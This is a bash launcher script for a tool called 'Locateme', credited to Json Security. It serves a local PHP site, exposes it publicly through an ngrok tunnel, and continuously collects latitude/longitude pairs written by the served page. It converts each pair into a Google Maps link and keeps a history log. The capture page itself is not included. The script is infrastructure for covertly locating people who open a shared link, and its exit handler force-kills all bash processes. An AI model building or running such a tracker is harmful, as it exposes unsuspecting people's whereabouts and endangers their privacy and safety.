#!/bin/bash

#colores
W="\e[0m"
N="\e[30;1m"
n="\e[30m"
R="\e[31m"
G="\e[32m"
Y="\e[33m"
B="\e[34m"
P="\e[35m"
C="\e[36m"
L="\e[37;2m"

#resaltado
rW="\e[48m"
rN="\e[40;1m"
rG="\e[42m"
rY="\e[43m"
rB="\e[44m"
rP="\e[45m"
rC="\e[46m"
rL="\e[47m"

#mas
bol="${W}\033[1m"
cur="\033[3m"
sub="\033[4m"

#salidas/entradas
cent=$Y
bord=$N
excr=$W
info=$W

T="$bord [${cent}+${W}${bord}]$excr"
F="$bord [${cent}-${W}${bord}]$excr"

A="${W}$bord [${bol}${Y}!${W}${bord}]$excr"
E="${W}$bord [${bol}${R}✘${W}${bord}]$excr"
S="${W}$bord [${bol}${G}✓${W}${bord}]$excr"

I="$bord [${cent}\$${bord}]${cent}❯$excr"
U="$bord [${cent}${bord}]${cent}❯$excr"

YN="$bord[${cent}Y${bord}/${cent}N${bord}]${excr}"

#info
autor="${bol}$bord [$info${bol}𝙹𝚜𝚘𝚗 𝚂𝚎𝚌𝚞𝚛𝚒𝚝𝚢${bord}]"
script="${bol}$bord [${info}${bol}Locateme$bord -$info$bol beta${bord}]"

trap ctrl_c INT                                            
ctrl_c() {
	echo -e "\n$A Saliendo..."
	killall -9 php > /dev/null 2>&1
	killall -9 ngrok > /dev/null 2>&1
	killall -9 bash > /dev/null 2>&1 &

	exit 1
}

banner() {
	clear
	printf "$bol
        \|/    \|/
          \    /
           \_/  ___   ___
           o o-'   '''   '
            O -.         |\\
                | |'''| |
                 ||   | |
                 ||    ||
                 \"     \"
    $autor $script
"
}

php_server() {
	php -S 0.0.0.0:8080 > /dev/null 2>&1 &
	echo -e "\n$T Servicio$cent php$excr corriendo en el puerto$cent 8080"
	echo -e "$U$cent http://0.0.0.0:8080\n"
}

ngrok_server() {
	echo -e "$F Ejecute el servicio$cent ngrok $YN"
	printf "$I "
	read op
	if [[ $op == 'y' || $op == 'Y' ]];then
		$(bash "$HOME/tunNgrok/ngrok.sh" -s http -p 8080 > /dev/null 2>&1 &)
		echo -e "\n$A Verificando link...\n"
		sleep 1
        cont=1
        while true;do
        	tunel=$(curl -s -N http://127.0.0.1:4040/api/tunnels | tr ',' '\n' | grep public | tr '/|:|"' ' ')
        	if [[ -n $tunel ]];then
				ip=$(echo $tunel | awk '{print $3}')
				echo -e "$T ip:$cent $ip\n";sleep .3                            
				xdg-open "http://$ip"
                break
			else
            	sleep 1
                let cont=cont+1
                if [[ $cont == 10 ]];then
                	echo -e "$E error de conexion\n"
                    break
				fi
			fi
        done
	else
		echo -e "\n$T https://github.com/JsonSecurity/tunNgrok"
	fi
	echo -e "$F Presione$cent CTRL$bord +$W$cent C$excr para salir..."
	while true;do
		logs=$(cat logs/result.txt)
		if [[ -n $logs ]];then
			lat=$(echo $logs | awk '{print $1}' FS=:)
			lon=$(echo $logs | awk '{print $2}' FS=:)
			
			url=$(cat ubc.html | grep "href" | awk '{print $2}' FS="=" | awk '{print $1}' | awk '{print $2}' FS=\")
			new_url="https://www.google.com/maps/place/${lat}+${lon}"
			#echo -e "$T $new_url"
			#echo -e "$F $url"
			sed -i -e 's!'"$url"'!'"$new_url"'!g' ubc.html
			
			echo -e "\n$U URL:$cent $new_url"
			echo "" > "logs/result.txt"
			echo -e "$logs\n" >> "db/history_log"
		fi
		sleep 1
	done
}

banner
php_server
ngrok_server
